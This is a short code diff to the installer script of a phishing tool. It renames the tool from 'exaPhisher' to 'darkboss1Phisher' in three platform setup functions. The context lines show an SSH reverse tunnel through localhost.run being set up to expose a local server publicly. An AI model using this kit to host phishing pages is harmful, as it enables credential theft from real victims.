@@ -80,7 +80,7 @@ def linux_debian():
     os.system("ssh -R 80:localhost:8080 nokey@localhost.run")
     print(bcolors.OKGREEN+"Setup Completed Successfully!")
     os.chdir("..")
-    print("Type python3 main.py to run exaPhisher!")
+    print("Type python3 main.py to run darkboss1Phisher!")
 
 def linux_arch():
     arch_yay = input(bcolors.WARNING+"Do you have yay package manager? [y/n]: "+bcolors.ENDC)
@@ -104,7 +104,7 @@ def linux_arch():
     os.system("ssh -R 80:localhost:8080 nokey@localhost.run")
     print(bcolors.OKGREEN+"Setup Completed Successfully!")
     os.chdir("..")
-    print("Type python3 main.py to run exaPhisher!")
+    print("Type python3 main.py to run darkboss1Phisher!")
 
 def termux():
     print(bcolors.OKGREEN+"Localtunnel setup"+bcolors.ENDC)
@@ -118,7 +118,7 @@ def termux():
     time.sleep(2)
     print(bcolors.OKGREEN+"Setup Completed Successfully!")
     os.chdir("..")
-    print("Type python3 main.py to run exaPhisher!")
+    print("Type python3 main.py to run darkboss1Phisher!")
 if scelta_termux == "y":
     termux()
     command("toch /src/termux_ver.py")
